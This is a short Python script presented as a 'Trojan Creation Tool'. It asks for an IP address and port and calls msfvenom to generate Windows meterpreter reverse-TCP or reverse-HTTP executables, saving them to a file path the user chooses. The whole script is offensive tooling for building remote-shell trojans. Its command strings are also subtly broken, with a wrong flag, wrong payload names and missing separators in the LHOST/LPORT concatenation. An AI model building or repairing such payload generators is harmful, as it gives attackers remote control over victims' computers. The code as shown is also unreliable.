import os

os.system("apt-get install figlet")
os.system("figlet TDA")
os.system("clear")

print("""
!!! Trojan Creation Tool !!!
""")

ip = input("Enter Local or Dis IP: ")
port = input("Enter The Port: ")

print("""
1: windows/meterpreter/reverse-tcp
2: windows/meterpreter/reverse-http
""")

payloadno = input("Enter The Payload Number: ")
loginpage = input("Enter The Registration Location(File Path): ")

if (payloadno == "1"):
    os.system("msfvenom -P windows/meterpreter/reverse-tcp LHOST=" +
              ip + "LPORT" + port + "-f exe -o" + loginpage)

elif (payloadno == "2"):
    os.system("msfvenom -P windows/meterpreter/reverse-http LHOST=" +
              ip + "LPORT" + port + "-f exe -o" + loginpage)
